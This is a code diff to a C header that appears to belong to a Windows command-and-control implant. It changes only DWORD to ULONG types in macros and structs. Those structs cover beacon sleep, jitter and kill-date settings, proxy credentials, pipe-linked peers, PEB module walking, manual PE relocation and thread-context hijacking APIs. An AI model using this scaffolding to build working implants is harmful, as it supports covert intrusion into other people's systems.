@@ -52,7 +52,7 @@
 #define MODULE_ENTRY(next)                      ((PLDR_MODULE) ((PBYTE)next - SIZEOF_MODULE_ENTRY))
 #define IN_MEMORY_ORDER_MODULE_LIST             ((PLIST_ENTRY) (&(PEB_POINTER)->Ldr->InMemoryOrderModuleList))
 #define MODULE_NAME( mod )						(mod->BaseDllName.Buffer)
-#define SIZEOF_MODULE_ENTRY						(sizeof(DWORD) * 4)
+#define SIZEOF_MODULE_ENTRY						(sizeof(ULONG) * 4)
 
 #define PEB_EBX 								((LPVOID) ((UINT_PTR)ThrCtx.Ebx + 0x8))
 #define PEB_RDX 								((LPVOID) ((UINT_PTR)ThrCtx.Rdx + 0x10))
@@ -61,13 +61,13 @@
 #define IMAGE_NT_HEADERS(base, dos)				((PIMAGE_NT_HEADERS) ((PBYTE)base + dos->e_lfanew))
 #define IMAGE_EXPORT_DIRECTORY(dos, nt)	    	((PIMAGE_EXPORT_DIRECTORY)((PBYTE)dos + (nt)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress))
 
-#define RELOCATION_ENTRIES(base, raw, off)		((PBASE_RELOCATION_ENTRY) ((DWORD_PTR)base + raw + off))
-#define RELOCATION_BLOCK(base, raw, off)		((PBASE_RELOCATION_BLOCK) ((DWORD_PTR)base + raw + off))
+#define RELOCATION_ENTRIES(base, raw, off)		((PBASE_RELOCATION_ENTRY) ((ULONG_PTR)base + raw + off))
+#define RELOCATION_BLOCK(base, raw, off)		((PBASE_RELOCATION_BLOCK) ((ULONG_PTR)base + raw + off))
 #define BASE_RELOCATION_COUNT(blk)				((blk->SizeOfBlock - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY))
 
-#define PATCH_ADDRESS(base, addr)				((LPVOID) ((DWORD_PTR)base + addr))
-#define SECTION_OFFSET(data1, data2) 			((LPVOID) ((DWORD64)data1->lpBase + data2->Sections->VirtualAddress))
-#define SECTION_DATA(data) 						((LPVOID) ((DWORD64)data->lpBuffer + data->Sections->PointerToRawData))
+#define PATCH_ADDRESS(base, addr)				((LPVOID) ((ULONG_PTR)base + addr))
+#define SECTION_OFFSET(data1, data2) 			((LPVOID) ((ULONG64)data1->lpBase + data2->Sections->VirtualAddress))
+#define SECTION_DATA(data) 						((LPVOID) ((ULONG64)data->lpBuffer + data->Sections->PointerToRawData))
 #define RVA(Ty, base, rva)  					(Ty) ((ULONG_PTR)base + rva)
 
 #define NtCurrentProcess()              		((HANDLE)(HANDLE) - 1)
@@ -164,7 +164,7 @@ typedef ULONG (WINAPI* RtlRandomEx_t)(PULONG Seed);
 typedef NTSTATUS(WINAPI* NtGetContextThread_t)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
 typedef NTSTATUS(WINAPI* NtSetContextThread_t)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
 typedef NTSTATUS(WINAPI* NtResumeThread_t)(HANDLE hThr, PULONG PrviousSuspendCount);
-typedef NTSTATUS(WINAPI* NtWaitForSingleObject_t)(HANDLE Handle, BOOLEAN Alertable, DWORD Timeout);
+typedef NTSTATUS(WINAPI* NtWaitForSingleObject_t)(HANDLE Handle, BOOLEAN Alertable, ULONG Timeout);
 typedef NTSTATUS(WINAPI* NtClose_t)(HANDLE hObject);
 typedef VOID(WINAPI* RtlInitUnicodeString_t)(PUNICODE_STRING Destinationstring, PCWSTR Sourcestring);
 typedef NTSTATUS (NTAPI* NtTestAlert_t)(VOID);
@@ -194,10 +194,10 @@ typedef struct {
 	LPVOID							lpBase;
 
 	SIZE_T 							tImage;
-	DWORD							dwSize;
-	DWORD							dwRead;
-	DWORD 							dwData;
-	DWORD 							dwHeads;
+	ULONG							dwSize;
+	ULONG							dwRead;
+	ULONG 							dwData;
+	ULONG 							dwHeads;
 	WORD 							nSections;
 	LARGE_INTEGER					lnSections;
 
@@ -220,7 +220,7 @@ typedef struct {
 
 typedef struct {
 	LPWSTR 	Buffer;
-	DWORD 	Length;
+	ULONG 	Length;
 } BUFFER, *PBUFFER;
 
 
@@ -233,10 +233,10 @@ typedef struct {
 	LPWSTR	ProxyUsername;
 	LPWSTR	ProxyPassword;
 	LPCWSTR	Accept;
-	DWORD	Access;
-	DWORD 	Flags;
+	ULONG	Access;
+	ULONG 	Flags;
 	HINTERNET	Handle;
-	DWORD 	nEndpoints;
+	ULONG 	nEndpoints;
 	LPWSTR	*Endpoints;
 	PBUFFER	*Headers;
 } HTTP_CONTEXT, *PHTTP_CONTEXT;
@@ -244,7 +244,7 @@ typedef struct {
 
 typedef struct _stream {
 	LPVOID	Buffer;
-	DWORD	Length;
+	ULONG	Length;
 	BOOL 	Ready;
 	struct _stream *Next;
 } STREAM, *PSTREAM;
@@ -253,14 +253,14 @@ typedef struct _stream {
 typedef struct {
 	LPVOID 	Handle;
     LPVOID  Buffer;
-	DWORD 	Length;
+	ULONG 	Length;
 	BOOL 	Little;
 } PARSER, *PPARSER;
 
 
 typedef struct _PEER_DATA {
 	HANDLE 		Handle;
-	DWORD 		PeerId;
+	ULONG 		PeerId;
 	BUFFER 		Pipename;
 	_PEER_DATA 	*Next;
 } PEER_DATA, *PPEER_DATA;
@@ -309,23 +309,23 @@ typedef struct {
 		HANDLE  EgressHandle;
 		LPSTR	Domain;
 		LPSTR	Hostname;
-		DWORD	Sleeptime;
-		DWORD	Jitter;
-		DWORD 	WorkingHours;
-		DWORD64	Killdate;
+		ULONG	Sleeptime;
+		ULONG	Jitter;
+		ULONG 	WorkingHours;
+		ULONG64	Killdate;
 	} Config;
 
 	struct {
 		INT 		Retry;
 		BOOL	    Checkin;
-		DWORD	    Ppid;
-		DWORD	    Pid;
-		DWORD	    Tid;
+		ULONG	    Ppid;
+		ULONG	    Pid;
+		ULONG	    Tid;
 		WORD	    Architecture;
-		DWORD	    OSVersion;
-		DWORD	    CurrentTaskId;
+		ULONG	    OSVersion;
+		ULONG	    CurrentTaskId;
         PPEER_DATA 	Peers;
-        DWORD		PeerId;
+        ULONG		PeerId;
 	} Session;
 
 	struct {
